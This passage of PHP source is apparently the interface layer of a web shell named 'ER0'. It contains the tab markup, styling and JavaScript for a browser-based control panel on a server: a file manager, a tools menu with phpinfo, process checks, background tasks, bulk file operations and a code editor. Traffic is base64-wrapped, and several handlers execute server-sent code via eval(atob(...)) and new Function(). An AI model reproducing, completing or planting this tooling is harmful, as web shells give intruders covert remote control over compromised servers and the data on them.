                                <button class="w-full inline-block p-2 xl:p-4 border-b-2 rounded-t-lg hover:border-themecolor-300 hover:text-themecolor-300" id="function_services-tab" data-tabs-target="#function_services" type="button" role="tab" aria-controls="function_services" aria-selected="false">Function & Services</button>
                            </li>

                        </ul>
                    </div>
                    <div id="default-tab-content">';

        //general info
        $HTML_CODE .= '
        <div class="hidden rounded-lg bg-themecolor-800" id="general_info" role="tabpanel" aria-labelledby="general_info-tab">
        <dl id="information-body-1" aria-labelledby="information-heading-1" class="-my-3 text-left mt-2 divide-y text-sm divide-themecolor-700">';
        $count = 0;
        foreach ($GLOBALS['ER0_array']['info_general_title'] as $inf) {
            $HTML_CODE .= self::__create_info($inf, $GLOBALS['ER0_array']['info_general_value'][$count]);
            $count++;
        }
        $HTML_CODE .= '</dl></div>';

        //service info
        $HTML_CODE .= '
        <div class="hidden rounded-lg bg-themecolor-800" id="function_services" role="tabpanel" aria-labelledby="function_services-tab">
        <dl id="information-body-1" aria-labelledby="information-heading-1" class="-my-3 text-left mt-2 divide-y text-sm divide-themecolor-700">';
        $count = 0;
        foreach ($GLOBALS['ER0_array']['info_service_title'] as $inf) {
            $HTML_CODE .= self::__create_info($inf, $GLOBALS['ER0_array']['info_service_value'][$count]);
            $count++;
        }
        $HTML_CODE .= '</dl></div>';

        $HTML_CODE .= '</div>

                    </div>
                </div>

            </div>';

        return $HTML_CODE;
    }

    private static function __shell_style()
    {
        return "
        @import url('https://fonts.googleapis.com/css2?family=" . str_replace(" ", "+", $GLOBALS['ER0_config']['font_face']) . ":ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&display=swap');

        :root {
            --php-dark-grey: transparent !important;
            --php-dark-blue: transparent !important;
            --php-medium-blue: transparent !important;
            --php-light-blue: transparent !important;
            --php-accent-purple: transparent !important;
            --ease-all: all 0.4s ease;

            --main-color: " . $GLOBALS['themes']['primary'] . " !important;
            --bg-color: " . $GLOBALS['themes']['background'] . " !important;
            --text-color: " . $GLOBALS['themes']['foreground'] . " !important;
            --font: '" . $GLOBALS['ER0_config']['font_face'] . "', sans-serif !important;
            --fontmono: 'Fira Code', monospace !important;
            --primary: transparent;
            --secondary: rgba(0, 0, 0, 0.2);
        }

        * {
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            text-rendering: optimizeLegibility;
            " . $GLOBALS['ER0_string']['transition'] . "
        }

        /* Firefox
        -----------------------------------------*/
        scrollbar {
            -moz-appearance: none;
            width: 8px;
            height: 8px;
        }

        scrollbar-track {
            background: transparent;
        }

        scrollbar-thumb {
            background: var(--secondary);
            border-radius: 5px;
        }

        scrollbar-thumb:hover {
            background: var(--secondary);
        }

        scrollbar-corner {
            background: transparent; /* or any other color you prefer */
        }

        resizer {
            background: transparent; /* or any other color you prefer */
        }

        scrollbar-button {
            background: transparent; /* or any other color you prefer */
            color: transparent; /* or any other color you prefer */
        }

        /* Webkit
        -----------------------------------------*/
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: transparent;
        }

        ::-webkit-scrollbar-track-piec {
            background: transparent;
        }

        ::-webkit-scrollbar-thumb {
            background: var(--secondary);
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--secondary);
        }

        ::-webkit-scrollbar-corner {
            background: transparent; /* or any other color you prefer */
        }

        ::-webkit-resizer {
            background: transparent; /* or any other color you prefer */
        }

        /*
        ::-webkit-scrollbar-button {
            background: transparent; /* or any other color you prefer */
            color: transparent; /* or any other color you prefer */
        }
        */

        body {
            transition: var(--ease-all);
        }

        .setFonts {
            font-family: var(--font);
        }
        .setFontsMono {
            font-family: var(--fontmono);
        }

        .filterBlue{
            filter: invert(100%) sepia(100%) saturate(1000%) hue-rotate(170deg) brightness(100%) contrast(100%);
        }

        .tablesorter-header {
            position: relative;
            cursor: pointer;
            padding-right: 20px; /* Adjust as needed for the arrow space */
        }

        .tablesorter-header:not(.sorter-false)::after {
            content: '';
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%) rotate(0deg);
            border: 5px solid transparent;  /* Create the triangle shape */
            border-top-color: var(--bg-color);  /* Initial arrow color */
            transition: transform 0.3s, border-top-color 0.3s;
        }

        .tablesorter-header.sort-up::after {
            border-top-color: #cbd5e1;  /* Change color for sorted ascending */

            transform: translateY(-50%) rotate(-180deg);
        }

        .tablesorter-header.sort-down::after {
            border-top-color: #cbd5e1;  /* Change color for sorted descending */

            transform: translateY(-50%) rotate(0deg);
        }
        ";
    }

    private static function __shell_javascript()
    {
        function js()
        {
            $SH_FILEMANAGER = ($GLOBALS['ER0_config']['show_filemanager'] ? 'true' : 'false');
            return
'class ConnectionChecker {
  static activeConnections = new Set(); // Static property to keep track of active connections

  constructor(
    url,
    connectionInfo,
    notifys = null,
    logging = false,
    evalOnClose = null
  ) {
    this.url = url;
    this.connectionInfo = connectionInfo;
    this.notifys = notifys;
    this.logging = logging;
    this.evalOnClose = evalOnClose;
    this.notif = "";
    this.eventSource = null;
    this.controller = null;
  }

  start() {
    // Check if the URL is already in the list of active connections
    if (ConnectionChecker.activeConnections.has(this.url)) {
      console.warn(`Connection for URL ${this.url} already exists.`);
      return; // Exit if the URL is already in use
    }

    // Add URL to the list of active connections
    ConnectionChecker.activeConnections.add(this.url);

    if (this.controller) {
      this.controller.abort();
    }

    this.controller = new AbortController();
    const signal = this.controller.signal;

    this.eventSource = new EventSource(this.url);

    this.eventSource.onmessage = (event) => {
      const data = JSON.parse(event.data);
      if (data.connected) {
        if (this.logging) {
          console.log(`Connection is still active -> ${this.connectionInfo}`);
        }
      } else {
        if (this.logging) {
          console.log(`Connection closed -> ${this.connectionInfo}`);
        }
        this.stop(); // Call stop to clean up
        if (this.notifys != null) {
          this.notif = JSON.parse(this.notifys);
          notify(
            this.notif.type,
            this.notif.detail,
            this.notif.redirect,
            this.notif.icon,
            this.notif.status,
            this.notif.color,
            this.notif.delay
          );
        }
        if (this.evalOnClose != null) {
          eval(atob(this.evalOnClose));
        }
      }
    };

    this.eventSource.onerror = (err) => {
      console.error(`Error occurred: ${err}`);
      this.stop(); // Call stop to clean up
    };

    signal.addEventListener("abort", () => {
      this.stop(); // Ensure `stop` cleans up
      console.log("Request aborted");
    });
  }

  stop() {
    if (this.controller) {
      this.controller.abort();
      this.controller = null; // Clean up the controller reference
    }
    if (this.eventSource) {
      this.eventSource.close();
      this.eventSource = null; // Clean up the EventSource reference
    }

    // Remove the URL from the list of active connections
    ConnectionChecker.activeConnections.delete(this.url);
    return true;
  }

  // Static method to list all running processes
  static listRunningConnections() {
    return Array.from(ConnectionChecker.activeConnections);
  }
}

class AjaxRequest {
  static activeRequests = [];
  constructor(method, url, data = {}) {
    this.method = method;
    this.url = url;
    this.data = data;
    this.xhr = new XMLHttpRequest();
    AjaxRequest.activeRequests.push(this);
  }
  send(successCallback, errorCallback) {
    this.xhr.open(this.method, this.url, true);
    if (this.method.toUpperCase() === "POST") {
      this.xhr.setRequestHeader(
        "Content-Type",
        "application/x-www-form-urlencoded"
      );
    }
    this.xhr.onreadystatechange = () => {
      if (this.xhr.readyState === XMLHttpRequest.DONE) {
        AjaxRequest.activeRequests = AjaxRequest.activeRequests.filter(
          (req) => req !== this
        );
        if (this.xhr.status >= 200 && this.xhr.status < 300) {
          successCallback(this.xhr.responseText);
        } else {
          errorCallback(this.xhr.status, this.xhr.statusText);
        }
      }
    };
    let serializedData = null;
    if (this.method.toUpperCase() === "POST" && typeof this.data === "object") {
      serializedData = this.serializeData(this.data);
    }
    this.xhr.send(serializedData);
  }
  abort() {
    if (this.xhr) {
      this.xhr.abort();
      AjaxRequest.activeRequests = AjaxRequest.activeRequests.filter(
        (req) => req !== this
      );
    }
  }
  serializeData(data) {
    const str = [];
    for (const p in data) {
      if (data.hasOwnProperty(p)) {
        str.push(encodeURIComponent(p) + "=" + encodeURIComponent(data[p]));
      }
    }
    return str.join("&");
  }
  static abortAll() {
    AjaxRequest.activeRequests.forEach((request) => request.abort());
    AjaxRequest.activeRequests = [];
  }
}

/**
 * Request Worker
 * @string proccess
 * @string id
 * @string url
 * @array executeEvent base64_encode [onUpdate, onExists, onError, onAbort]
 * @bool logging
 */
class RequestWorker {
  static activeTasks = new Map(); // Use a Map to track active tasks with keys as unique identifiers

  constructor(process, id, url, executeEvent = null, logging = false) {
    this.process = process;
    this.id = id;
    this.url = url;
    this.executeEvent = executeEvent;
    this.logging = logging;
    this.executeData = null;
    this.eventSource = null;
    this.controller = null;
    this.preventStopNotify = false;
    this.taskKey = `${process}|${id}|${url}`; // Unique key for the task
  }

  start() {
    if(this.executeEvent != null) this.executeData = JSON.parse(atob(this.executeEvent));

    // Check if the task is already in the list of active tasks
    if (RequestWorker.activeTasks.has(this.taskKey)) {
      console.warn(
        `Connection for ID ${this.id}, URL ${this.url}, and Process ${this.process} already exists.`
      );
      if(this.executeEvent != null && isArray(this.executeEvent)){
        if(this.executeData.onExists != null){
          const existsFunction = new Function("taskKey", atob(this.executeData.onExists));
          existsFunction(this.taskKey); // Pass `data` as a parameter
        }
      }
      return; // Exit if the task is already in use
    }

    // Add task to the list of active tasks
    RequestWorker.activeTasks.set(this.taskKey, this);

    if (this.controller) {
      this.controller.abort();
    }

    this.controller = new AbortController();
    const signal = this.controller.signal;

    this.eventSource = new EventSource(this.url);

    this.eventSource.onmessage = (event) => {
      const data = JSON.parse(event.data);
      if(this.logging) console.log(`Task Key : ${this.taskKey}\nValue : ${data}`);

      if(this.executeEvent != null && isArray(this.executeEvent)){
        if(this.executeData.onUpdate != null){
          const updateFunction = new Function("data, process, id, url", atob(this.executeData.onUpdate));
          updateFunction(data, this.process, this.id, this.url); // Pass `data` as a parameter
        }
      }
    };

    this.eventSource.onerror = (err) => {
      if(this.executeEvent != null && isArray(this.executeEvent)){
        if(this.executeData.onError != null){
          const errorFunction = new Function("err", atob(this.executeData.onError));
          errorFunction(err); // Pass `data` as a parameter
        }
      }
      console.error(`Error occurred: ${err}`);
      this.stop(); // Call stop to clean up
    };

    signal.addEventListener("abort", () => {
      if(this.executeEvent != null && isArray(this.executeEvent) && !this.preventStopNotify){
        if(this.executeData.onAbort != null){
          const abortFunction = new Function(atob(this.executeData.onAbort));
          abortFunction(); // Pass `data` as a parameter
        }
      }
      this.stop(); // Ensure `stop` cleans up
      console.log("Request aborted");
    });
  }

  stop(preventStopNotify = false) {
    const taskKey = this.taskKey;
    this.preventStopNotify = preventStopNotify;
    if (this.controller) {
      this.controller.abort();
      this.controller = null; // Clean up the controller reference
    }
    if (this.eventSource) {
      this.eventSource.close();
      this.eventSource = null; // Clean up the EventSource reference
    }

    // Remove the task from the list of active tasks
    RequestWorker.activeTasks.delete(taskKey);
  }

  // Static method to stop a specific task by id, url, and process
  static stopTask(process, id, url, onAbort = null, preventStopNotify = false) {
    const taskKey = `${process}|${id}|${url}`;
    const task = RequestWorker.activeTasks.get(taskKey);
    if (task) {
      task.stop(preventStopNotify); // Stop and clean up the task
      console.log(
        `Task with ID ${id}, URL ${url}, and Process ${process} stopped.`
      );
      if(onAbort != null){
        const abortFunction = new Function(atob(onAbort));
        abortFunction(); // Pass `data` as a parameter
      }
    } else {
      console.warn(
        `Task with ID ${id}, URL ${url}, and Process ${process} not found.`
      );
    }
  }

  // Static method to list all running tasks
  static listRunningTasks() {
    return Array.from(RequestWorker.activeTasks.keys());
  }
}

ALWAYS_SHOW_FILEMANAGER = '. $SH_FILEMANAGER .';
SCRIPT_PATH = "'. __SCRIPT__ .'";
FILESMAN = "'. $GLOBALS['ER0_string']['filesman'] .'";
TOOLS = "'. $GLOBALS['ER0_string']['tools'] .'";
SETTING = "'. $GLOBALS['ER0_string']['setting'] .'";

const title = "'. $GLOBALS['ER0_string']['title'] .'";
let index = 0;
let direction = 1;

animateTitle();

function animateTitle() {
  let currentTitle = title.substring(0, index);
  if (direction === 1) {
    currentTitle += title.charAt(index).toUpperCase();
  } else {
    currentTitle += title.charAt(index).toLowerCase();
  }
  currentTitle += title.substring(index + 1);
  document.title = "✦ " + currentTitle + " ✦";
  index += direction;
  if (index >= title.length) {
    direction = -1;
    index = title.length - 1;
  } else if (index < 0) {
    direction = 1;
    index = 0;
  }
  setTimeout(animateTitle, 300);
}

function checkProccess(patern, return_type, show_usr = true, evalCode = null) {
  var DATA = {
    key: "CHKPROC",
    patern: charcodeEnc(patern),
    rtype: charcodeEnc(return_type),
    suser: show_usr,
  };

  const sendRequest = new AjaxRequest("POST", SCRIPT_PATH, DATA);
  sendRequest.send(
    function (data) {
      if (evalCode != null) {
        eval(evalCode);
      } else {
        return data;
      }
    },
    function (status, error) {
      if (status != 0) {
        console.error("AJAX Error:", status, error);
        return return_type == `bool` ? false : `AJAX Error: ${status} ${error}`;
      }
    }
  );
}

function task_manager(taskUrl, name, action, evalOnSuccessOrClass = null, optionalData = "none") {
  var DATA = {
    key: "mktmpfile",
    task: charcodeEnc(taskUrl),
    name: charcodeEnc(name),
    action: charcodeEnc(action),
    optionalData: charcodeEnc(optionalData),
  };

  const chkprc = new AjaxRequest("POST", SCRIPT_PATH, DATA);
  chkprc.send(
    function (data) {
      data = JSON.parse(data);
      if (data.status && evalOnSuccessOrClass != null) {
        eval(evalOnSuccessOrClass);
      }
      if (data.message != null) {
        console.log(charcodeDec(data.message));
      }
    },
    function (status, error) {
      if (status != 0) {
        console.error("AJAX Error:", status, error);
      }
    }
  );
}

function runAfter(code, delay) {
  setTimeout(() => {
    eval(code);
  }, delay);
}

function isArray(arr) {
  return typeof arr.length === "number" && !Object.getOwnPropertyDescriptor(arr, "length").enumerable;
}

function basename(path) {
  return path.split("/").reverse()[0];
}

function ucfirst(str) {
  return str.charAt(0).toUpperCase() + str.slice(1);
}

function ucwords(str) {
  return str.toLowerCase().replace(/\b[a-z]/g, function (letter) {
    return letter.toUpperCase();
  });
}

if (localStorage.getItem("state") != "") {
  rightCon(true, localStorage.getItem("state"));
}

function rightCon(set = false, state = `hide`) {
  if (set) {
    if (state == `show`) {
      $(`#container-right`).removeClass(`hidden`);
      $(`#container-right`).addClass(`grid`);
      $(`#dock-toggle`).removeClass(`bx-dock-right`);
      $(`#dock-toggle`).addClass(`bxs-dock-right`);
    } else {
      $(`#container-right`).removeClass(`grid`);
      $(`#container-right`).addClass(`hidden`);
      $(`#dock-toggle`).removeClass(`bxs-dock-right`);
      $(`#dock-toggle`).addClass(`bx-dock-right`);
    }
  } else {
    if ($(`#container-right`).css(`display`) == `grid`) {
      $(`#container-right`).removeClass(`grid`);
      $(`#container-right`).addClass(`hidden`);
      $(`#dock-toggle`).removeClass(`bxs-dock-right`);
      $(`#dock-toggle`).addClass(`bx-dock-right`);
      state = `hide`;
    } else {
      $(`#container-right`).removeClass(`hidden`);
      $(`#container-right`).addClass(`grid`);
      $(`#dock-toggle`).removeClass(`bx-dock-right`);
      $(`#dock-toggle`).addClass(`bxs-dock-right`);
      state = `show`;
    }

    localStorage.setItem("state", state);
  }

  if (state == `show`) {
    $(`#lside`).addClass(`sm:me-4`);
    $(`#dir_container`).removeClass(`h-[50vh]`);
    $(`#dir_container`).addClass(`h-[70vh]`);
  } else {
    $(`#lside`).removeClass(`sm:me-4`);
    $(`#dir_container`).removeClass(`h-[70vh]`);
    $(`#dir_container`).addClass(`h-[50vh]`);
  }
}

hljs.configure({
  ignoreUnescapedHTML: true,
});

restoreEditorConfig();

function saveEditorConfig(themeId, fontId, size, wrap) {
  themeId = $(`#${themeId}`).val();
  fontId = $(`#${fontId}`).val();
  size = $(`#${size}`).val();
  var ER0_editorConfig = {
    theme: themeId,
    font: fontId,
    size: size,
    wrap: wrap,
  };
  localStorage.setItem(
    "ER0_editorConfig",
    JSON.stringify(ER0_editorConfig)
  );

  FURL =
    `@import url("https://fonts.googleapis.com/css2?&display=swap&family=` +
    fontId.replace(` `, `+`) +
    `");`;
  FONT = `"${fontId}", monospace !important`;
  TURL =
    `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/` +
    themeId;
  WRAPWORD = wrap
    ? `
                      white-space: pre-wrap;
                      word-wrap: break-word;`
    : ``;

  TEXTAREAWRAP = wrap
    ? ``
    : `
                      .editorContainer textarea {
                          white-space: pre;
                          overflow-wrap: normal;
                      }
                  `;

  if (fontId == `default`) {
    FONT = `var(--font)`;
    FURL = ``;
  }

  if (themeId == `default`) {
    TURL = `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/tokyo-night-dark.min.css`;
  }

  $(`#editor-theme`).attr(`href`, TURL);

  $(`#editor-style`).html(`
                      ${FURL}
                      .editorContainer pre, .editorContainer code, .editorContainer textarea {
                          font-family: ${FONT};
                          ${WRAPWORD}
                          font-size: ${size}pt !important;
                      }
                      ${TEXTAREAWRAP}
                  `);
}

function restoreEditorConfig() {
  if (localStorage.getItem("ER0_editorConfig") != null) {
    data = JSON.parse(localStorage.getItem("ER0_editorConfig"));
    theme = data.theme;
    font = data.font;
    size = data.size;
    wrap = data.wrap;
  } else {
    theme = `tokyo-night-dark.min.css`;
    font = `var(--font)`;
    size = `12`;
    wrap = false;
  }

  FURL =
    `@import url("https://fonts.googleapis.com/css2?&display=swap&family=` +
    font.replace(` `, `+`) +
    `");`;
  FONT = `"${font}", monospace !important`;
  TURL =
    `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/` +
    theme;
  WRAPWORD = wrap
    ? `
                      white-space: pre-wrap;
                      word-wrap: break-word;`
    : ``;

  TEXTAREAWRAP = wrap
    ? ``
    : `
                      .editorContainer textarea {
                          white-space: pre;
                          overflow-wrap: normal;
                      }
                  `;

  if (font == `default`) {
    FONT = `var(--font)`;
    FURL = ``;
  }

  if (theme == `default`) {
    TURL = `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/tokyo-night-dark.min.css`;
  }

  $(`#editor-theme`).attr(`href`, TURL);

  $(`#editor-style`).html(`
                      ${FURL}
                      .editorContainer pre, .editorContainer code, .editorContainer textarea {
                          font-family: ${FONT};
                          ${WRAPWORD}
                          font-size: ${size}pt !important;
                      }
                      ${TEXTAREAWRAP}
                  `);
}

function charcodeEnc(str) {
  const encoder = new TextEncoder();
  const utf8Array = encoder.encode(str);
  return btoa(String.fromCharCode(...utf8Array));
}

function charcodeDec(encoded) {
  const binaryString = atob(encoded);
  const bytes = Uint8Array.from(binaryString, (c) => c.charCodeAt(0));
  const decoder = new TextDecoder();
  return decoder.decode(bytes);
}

function highlightJS(cblock) {
  $(`#${cblock}`).each(function (i, e) {
    hljs.highlightElement(e);
  });
}

function updateCode(ele, cblock) {
  cBlock = document.getElementById(cblock);
  tArea = document.getElementById(ele);

  let content = tArea.value;

  content = content.replace(/&/g, `&amp`);
  content = content.replace(/</g, `&lt;`);
  content = content.replace(/>/g, `&gt;`);

  cBlock.innerHTML = content;

  highlightJS(cblock);
}

function editorSet(ele, cblock) {
  cBlock = document.getElementById(cblock);
  tArea = document.getElementById(ele);

  tArea.addEventListener("input", () => {
    cBlock.removeAttribute("data-highlighted");
    updateCode(ele, cblock);
  });

  tArea.addEventListener("scroll", () => {
    cBlock.scrollTop = tArea.scrollTop;
    cBlock.scrollLeft = tArea.scrollLeft;
  });

  tArea.addEventListener(`keydown`, function (e) {
    if (e.key === `Enter`) {
      cBlock.removeAttribute("data-highlighted");

      e.preventDefault();

      var cursorPos = tArea.selectionStart;

      var prevLine = tArea.value
        .substring(0, cursorPos)
        .split(`\n`)
        .slice(-1)[0];

      var indent = prevLine.match(/^\s*/)[0];

      tArea.setRangeText(`\n` + indent, cursorPos, cursorPos, `end`);

      updateCode(ele, cblock);
      return;
    }

    if (
      e.key === "Tab" &&
      !e.shiftKey &&
      tArea.selectionStart == tArea.selectionEnd
    ) {
      cBlock.removeAttribute("data-highlighted");

      e.preventDefault();

      let cursorPosition = tArea.selectionStart;

      let newValue =
        tArea.value.substring(0, cursorPosition) +
        "    " +
        tArea.value.substring(cursorPosition);

      tArea.value = newValue;
      tArea.selectionStart = cursorPosition + 4;
      tArea.selectionEnd = cursorPosition + 4;

      updateCode(ele, cblock);
      return;
    }

    if (
      e.key === "Tab" &&
      e.shiftKey &&
      tArea.selectionStart == tArea.selectionEnd
    ) {
      cBlock.removeAttribute("data-highlighted");

      e.preventDefault();

      let cursorPosition = tArea.selectionStart;

      let leadingSpaces = 0;
      for (let i = 0; i < 4; i++) {
        if (tArea.value[cursorPosition - i - 1] === " ") {
          leadingSpaces++;
        } else {
          break;
        }
      }

      if (leadingSpaces > 0) {
        let newValue =
          tArea.value.substring(0, cursorPosition - leadingSpaces) +
          tArea.value.substring(cursorPosition);

        tArea.value = newValue;
        tArea.selectionStart = cursorPosition - leadingSpaces;
        tArea.selectionEnd = cursorPosition - leadingSpaces;
      }

      updateCode(ele, cblock);
      return;
    }

    if ((e.key == `Tab`) & (tArea.selectionStart != tArea.selectionEnd)) {
      cBlock.removeAttribute("data-highlighted");

      e.preventDefault();

      let lines = this.value.split(`\n`);

      let startPos =
        this.value.substring(0, this.selectionStart).split(`\n`).length - 1;
      let endPos =
        this.value.substring(0, this.selectionEnd).split(`\n`).length - 1;

      let spacesRemovedFirstLine = 0;
      let spacesRemoved = 0;

      if (e.shiftKey) {
        for (let i = startPos; i <= endPos; i++) {
          lines[i] = lines[i].replace(/^ {1,4}/, function (match) {
            if (i == startPos) spacesRemovedFirstLine = match.length;

            spacesRemoved += match.length;

            return ``;
          });
        }
      } else {
        for (let i = startPos; i <= endPos; i++) {
          lines[i] = `    ` + lines[i];
        }
      }

      let start = this.selectionStart;
      let end = this.selectionEnd;

      this.value = lines.join(`\n`);

      this.selectionStart = e.shiftKey
        ? start - spacesRemovedFirstLine
        : start + 4;

      this.selectionEnd = e.shiftKey
        ? end - spacesRemoved
        : end + 4 * (endPos - startPos + 1);

      updateCode(ele, cblock);
      return;
    }
  });
}

function getParams() {
  var hash = window.location.hash.substring(1);
  var params = new URLSearchParams(hash);

  return {
    action: params.get("action") != null ? params.get("action") : FILESMAN,
    dir:
      params.get("dir") != null
        ? params.get("dir")
        : "'. Utils::__string_enc("getcwd"()) .'",
    tools: params.get("tools") != null ? params.get("tools") : "",
    file: params.get("file") != null ? params.get("file") : "",
    dirname: params.get("dirname") != null ? params.get("dirname") : "",
    opt: params.get("opt") != null ? params.get("opt") : "",
  };
}

function notify(
  type,
  detail = null,
  redirect = false,
  icon = null,
  status = null,
  color = null,
  delay = null
) {
  loading = false;
  let timerInterval;

  if (type == "loading") {
    loading = true;
  } else {
    icon =
      icon != null
        ? icon
        : type == "success"
        ? `<i class="bx bx-check bx-tada text-5xl"></i>`
        : `<i class="bx bx-x bx-tada text-5xl"></i>`;
    status =
      status != null ? status : type == "success" ? `SUCCESS!` : `FAILED!`;
    color = color != null ? color : type == "success" ? `green` : `red`;
    delay = delay != null ? delay : type == "success" ? 1500 : 3000;
    detail = charcodeDec(detail);
  }

  if (!loading) {
    Swal.fire({
      position: `bottom-end`,
      showConfirmButton: false,
      background: `transparent`,
      backdrop: `transparent`,
      showClass: {
        popup: `
                          animate__animated
                          animate__fadeInRight
                          animate__faster
                          `,
      },
      hideClass: {
        popup: `
                          animate__animated
                          animate__fadeOutRight
                          animate__faster
                          `,
      },
      html: `
                      <div class="flex items-center px-4 py-2 text-sm border shadow-lg rounded bg-background text-themecolor-${color} border-${color}-800" role="alert">
                          <div class="h-full flex items-center mr-2">
                              ${icon}
                          </div>
                          <div class="grid text-left">
                              <span class="font-bold text-lg">${status}</span>
                              <span class="font-medium text-themecolor-400 text-md">Detail : ${detail}</span>
                          </div>
                      </div>
                      `,
      timer: delay,
      willClose: () => {
        if (redirect) {
          params = getParams();
          var dir = params["dir"];
          if (type == `error`) {
            window.history.go(-1);
          } else {
            type == "success"
              ? (location.href = `#action=${FILESMAN}&dir=${dir}`)
              : "";
          }
        }
      },
    });
  } else {
    Swal.fire({
      position: `bottom-end`,
      showConfirmButton: false,
      background: `transparent`,
      backdrop: `transparent`,
      allowOutsideClick: false,
      showClass: {
        popup: `
                              animate__animated
                              animate__fadeInRight
                              animate__faster
                              `,
      },
      hideClass: {
        popup: `
                              animate__animated
                              animate__fadeOutRight
                              animate__faster
                              `,
      },

      html: `
                          <div class="flex items-center px-4 py-2 text-sm border shadow-lg rounded bg-background text-themecolor-400 border-themecolor-400" role="alert">
                              <div class="h-full flex items-center mr-3">
                                  <i class="bx bx-loader-alt bx-spin text-5xl"></i>
                              </div>
                              <div class="grid text-left gap-2 w-full">
                                  <span class="font-medium text-lg">Please Wait... <span id="counter___" class="text-themecolor-300"></span></span>
                                  <button type="button" onclick="Swal.close(); AjaxRequest.abortAll();" class="px-3 py-2 w-auto text-xs font-medium text-center text-themecolor-400 rounded-lg focus:ring-4 focus:outline-none focus:ring-themecolor-700 bg-themecolor-800 border-themecolor-600 hover:text-foreground hover:bg-themecolor-700">Cancel Request</button>
                              </div>
                          </div>
                          `,
      didOpen: () => {
        count = 0;
        const timer = Swal.getPopup().querySelector("#counter___");
        timerInterval = setInterval(() => {
          timer.textContent = count;
          count++;
        }, 1000);
      },

      willClose: () => {
        clearInterval(timerInterval);
      },
    }).then((result) => {
      if (result.dismiss === Swal.DismissReason.timer) {
        console.log("I was closed by the timer");
      }
    });
  }
}

function search() {
  var input, filter, table, tr, td, i, j, txtValue;
  input = document.getElementById("dir_search");
  filter = input.value.toUpperCase();
  table = document.getElementById("dir_table_content");
  tr = table.getElementsByTagName("tr");

  for (i = 0; i < tr.length; i++) {
    tr[i].style.display = "none";  // Hide the row initially
    td = tr[i].getElementsByTagName("td");

    for (j = 0; j < td.length; j++) {
      if (td[j]) {
        txtValue = td[j].textContent || td[j].innerText;
        if (txtValue.toUpperCase().indexOf(filter) > -1) {
          tr[i].style.display = "";  // Show the row if a match is found
          break;  // Exit the loop once a match is found
        }
      }
    }
  }
}

function run_bulk(element) {
  var x = document.querySelectorAll(".check-item");
  var action = $(`#action_bulk_items`).val();
  var data = new Array();
  count = 0;
  for (var i = 0; i < x.length; i++) {
    if (x[i].checked) {
      dat = {
        action: action,
        item: x[i].getAttribute("item"),
        dir: x[i].getAttribute("dir"),
        file: x[i].getAttribute("file"),
      };
      data.push(dat);
      count++;
    }
  }
  if (data.length > 0) {
    BLK(action, data, count);
    $("#tools_container").addClass(`overflow-auto`);
  }
}
function C(id) {
  var x = document.querySelectorAll(".check-item");
  var xs = document.querySelector("#" + id);
  for (var i = 0; i < x.length; i++) {
    if (xs.checked) {
      x[i].checked = true;
    } else {
      x[i].checked = false;
    }
  }
}
function S(id, redirect = true) {
  var dataId = JSON.parse(charcodeDec(id));
  value = [];
  bulk = false;
  for (var key in dataId) {
    var idVal = document.getElementById(dataId[key]).value;
    value[key] = idVal;
    if (dataId[key] == "bulk") {
      bulk = true;
    }
  }
  if (bulk) {
    action = value[0];
    filesource = value[1];
    actionvalue = charcodeEnc(value[2]);
    BLKSV(action, filesource, actionvalue);
  } else {
    if (!redirect) {
      SVD(charcodeEnc(value[0]), charcodeEnc(value[1]), redirect);
    } else {
      SVD(charcodeEnc(value[0]), charcodeEnc(value[1]));
    }
  }
}
function R() {
  params = getParams();
  var action = params["action"];
  var dir = params["dir"];
  var tools = params["tools"];
  var file = params["file"];
  var dirname = params["dirname"];
  var opt = params["opt"];

  $(`#phpInfo`).attr(
    `href`,
    `#action=${TOOLS}&dir=${dir}&tools='. Utils::__string_enc('phpinfo') .'`
  );
  $(`#setting-btn`).attr(`href`, `#action=${SETTING}&dir=${dir}`);
  $("#filemanager").removeClass(`hidden`);
  $("#csetdir").val(dir);
  $("#tools_container").removeClass(`overflow-auto`);
  EXD(action, dir, tools, file, dirname, opt);
}
R();
$(window).on("hashchange", R);

function BLK(actions, value, countItems) {
  params = getParams();
  var dir = params["dir"];
  var DATA = {
    key: "BLK",
    actions: actions,
    value: charcodeEnc(JSON.stringify(value)),
    count: countItems,
    dir: dir,
  };
  if (ALWAYS_SHOW_FILEMANAGER) {
    $("#tools_container").addClass(`hidden`);
  }

  notify(`loading`);

  const sendRequest = new AjaxRequest("POST", SCRIPT_PATH, DATA);
  sendRequest.send(
    function (data) {
      data = JSON.parse(data);
      Swal.close();
      if (!ALWAYS_SHOW_FILEMANAGER) {
        $("#filemanager").addClass(`hidden`);
        if (
          charcodeDec(data.content) == "" ||
          charcodeDec(data.content) == "DONT_SHOW_TOOLS"
        ) {
          $("#filemanager").removeClass(`hidden`);
        }
        $("#tools_container").addClass(`hidden`);
      }
      if (!charcodeDec(data.content).includes("DONT_SHOW_TOOLS")) {
        $("#" + charcodeDec(data.container)).removeClass("hidden");
      } else {
        location.href = `#action=${action}&dir=${dir}`;
      }
      $("#" + charcodeDec(data.container)).html(charcodeDec(data.content));
      $("#" + charcodeDec(data.dir_con)).html(charcodeDec(data.dir_content));
      $("#" + charcodeDec(data.cwd_con)).html(charcodeDec(data.cwd_content));
      $("#" + charcodeDec(data.menu_con)).html(charcodeDec(data.menu_content));
    },
    function (status, error) {
      if (status != 0) {
        console.error("AJAX Error:", status, error);
        clr = `red`;
        if (status >= 500) {
          clr = `yellow`;
        }
        notify(
          `error`,
          charcodeEnc(status + " " + error),
          true,
          `<i class="bx bx-error bx-tada text-5xl" ></i>`,
          `ERROR!`,
          clr,
          10000000
        );
      }
    }
  );
}

function BLKSV(actions, source, value) {
  params = getParams();
  var dir = params["dir"];

  var DATA = {
    key: "BLKSV",
    action: actions,
    source: source,
    value: value,
    dir: dir,
  };

  notify(`loading`);

